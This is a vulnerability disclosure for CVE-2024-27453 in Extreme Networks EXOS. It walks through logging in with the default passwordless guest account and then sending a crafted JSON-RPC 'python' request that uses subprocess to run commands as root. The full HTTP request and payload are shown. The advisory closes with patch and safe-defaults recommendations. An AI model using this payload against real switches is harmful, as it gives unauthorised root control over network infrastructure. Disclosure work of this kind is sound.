## CVE-2024-27453

EXOS Privilege Escalation from Guest to Root (RCE) via Python MMI

## SUMMARY

Jason Goss uncovered a vulnerability in version 22.6.1.4 of Extreme Networks' operating system, ExtremeXOS (EXOS), which has been designated as [CVE-2024-27453](https://www.cve.org/CVERecord?id=CVE-2024-27453). After this discovery, Extreme Networks was notified and agreed to proceed under their responsible disclosure process.

This vulnerability enables attackers to escalate privileges from a read-only user account to root by crafting a request to the [Machine-to-Machine Interface (MMI)](https://documentation.extremenetworks.com/app_notes/MMI/121152_MMI_Application_Release_Notes.pdf). Successful exploitation allows for remote code execution (RCE) on the switch with root privileges, giving the attacker total control over the device. Additionally, the presence of a default read-only user account commonly configured on these devices significantly simplifies exploitation.

## VULNERABILITY DETAILS

To exploit this vulnerability, open a browser configured to route traffic through a web proxy (e.g., Burp, OWASP ZAP). Navigate to the vulnerable device's web management portal and log in using a read-only user account. This step is simplified due to the default configuration of this version of EXOS, which includes a guest [user account](https://documentation.extremenetworks.com/exos_22.6/GUID-4F7BD24C-2829-466D-A168-CCD7B8532671.shtml) with the username `User` and no password.

Once authenticated, the version number is displayed on the left-hand side of the dashboard.

![](images/Version-CVE-2024-27453.jpg)

After verifying the version number from the dashboard, switch to the interception proxy and copy the cookie containing the session tokens.

```

Cookie: x-auth-token=[redacted]; session=[redacted]; chalet_locale=en; session_id=[redacted]; x-auth-token= [redacted].[redacted].[redacted]; session= [redacted].[redacted].[redacted]

```

To verify that you have the correct cookie, the `x-auth-token` can be base64 decoded to obtain the username, access level, and expiration (in epoch format):

```

{'alg':'HS256','exp':1714545903,'iat':1714459503,'username':'user','access_level':'user'}

```

Once obtained, a request to the python method of the [Machine-to-Machine Interface (MMI)](https://documentation.extremenetworks.com/app_notes/MMI/121152_MMI_Application_Release_Notes.pdf) can be crafted to include the python `subprocess` module. This combination allows for the execution of commands as root on the host operating system (EXOS). In the example below, a request is made to obtain the environment variables (e.g., `env`) which contains the current username (e.g., root):

```
POST /jsonrpc/?show HTTP/1.1
Host: XXX.XXX.XXX.XXX
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: chalet_locale=en; session_id=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; x-auth-token= XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; session= XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Connection: close
Content-Type: application/json
Content-Length: 129

{"method":"python","id":"10","jsonrpc":"2.0","params":["import subprocess\nprint\nprint subprocess.check_output([\"env\"])"]

```

This results in the switch returning the EXOS environmental variables including the `USER` variable confirming root access to the device:

## RECOMMENDATIONS

[CVE-2024-27453](https://www.cve.org/CVERecord?id=CVE-2024-27453) has been addressed in EXOS versions 22.7 and later. Users are strongly advised to update their systems to the most recent version. It is also recommended to enable "[Safe Defaults Mode](https://documentation.extremenetworks.com/exos_22.6/GUID-5CC53A43-5F9B-4B64-A746-01515C51BAAB.shtml)", which removes all factory default login accounts, including the default guest account used in this article.
